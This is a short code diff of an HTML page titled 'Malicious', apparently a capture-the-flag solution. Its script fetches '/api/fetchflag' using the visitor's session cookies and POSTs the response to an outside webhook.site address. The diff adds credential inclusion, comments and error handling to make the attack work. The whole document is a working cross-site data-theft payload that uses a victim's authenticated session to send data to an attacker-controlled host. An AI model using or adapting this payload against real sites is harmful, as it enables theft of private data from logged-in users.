@@ -4,14 +4,22 @@
 <head><title>Malicious</title></head>
 <body>
 <script>
-fetch("/api/fetchflag")
+  // Fetch the flag from the server with proper session cookies
+  fetch("/api/fetchflag", {
+    method: 'GET',
+    credentials: 'include'  // Include cookies for the authenticated session
+  })
   .then(res => res.json())
   .then(data => {
+    // Send the fetched data to the webhook
     fetch("https://webhook.site/0bd8b95b-3b87-4edf-96d6-06a0c337d524", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(data)
     });
+  })
+  .catch(err => {
+    console.error('Error fetching the flag:', err);
   });
 </script>
 </body>
